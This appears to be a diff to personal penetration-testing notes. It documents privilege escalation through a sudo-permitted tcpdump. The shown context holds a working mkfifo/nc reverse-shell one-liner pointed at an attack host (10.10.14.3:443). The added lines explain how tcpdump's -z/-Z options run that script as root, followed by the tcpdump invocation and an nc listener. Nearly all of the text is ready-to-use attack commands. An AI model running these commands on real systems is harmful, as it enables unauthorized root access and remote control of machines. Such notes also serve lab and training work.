@@ -234,5 +234,14 @@ $ cat /tmp/.test
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
 $ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
 ```
+%% once you run sudo -l and tcpdump is one of the command s you can run as root with nopasswd you can leverage that with the -Z option when you run the tcpdump command to start a reverse shell on our attack machine and escalate to root %%
+
+```
+$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+$ nc -lvnp 443
+```
+%% tcpdump command to connect back to our listener on attack host %%
+
+
 
 
